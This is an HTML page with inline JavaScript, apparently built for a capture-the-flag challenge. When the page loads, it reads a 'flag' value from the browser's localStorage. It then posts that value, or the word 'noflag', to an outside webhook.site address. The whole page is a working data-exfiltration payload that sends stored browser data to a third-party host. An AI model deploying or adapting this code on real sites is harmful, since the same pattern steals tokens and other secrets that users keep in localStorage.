<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Flag or NoFlag</title>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Function to send a message to the webhook URL via POST request
            const sendMessageToWebhook = (message) => {
                const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flags';
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json', // Indicate that the body is JSON
                    },
                    body: JSON.stringify({ message: message }), // Send the message in the request body
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Message sent successfully:', message);
                        alert('Message sent successfully!');
                    } else {
                        console.error('Failed to send message. Status:', response.status);
                        alert('Failed to send message.');
                    }
                })
                .catch(error => {
                    console.error('Error sending message:', error);
                    alert('Error sending message.');
                });
            };

            // Check if the flag is stored in localStorage
            const storedFlag = localStorage.getItem('flag');
            if (storedFlag) {
                console.log('Stored flag:', storedFlag);
                // If flag is stored, show a button to send the flag
                const sendButton = document.createElement('button');
                sendButton.innerText = 'Send Flag';
                sendButton.onclick = () => {
                    sendMessageToWebhook(storedFlag); // Send the stored flag on button click
                };
                document.body.appendChild(sendButton);
            } else {
                console.log('No flag stored in localStorage.');
                sendMessageToWebhook('noflag'); // Send 'noflag' if no flag is stored
                alert('No flag found in localStorage. Sent "noflag".');
            }
        });
    </script>
</head>
<body>
    <h1>Send Flag or NoFlag</h1>
    <p>If a flag is stored, you can send it to the specified webhook by clicking the button below. If no flag is stored, a "noflag" message will be sent automatically.</p>
</body>
</html>
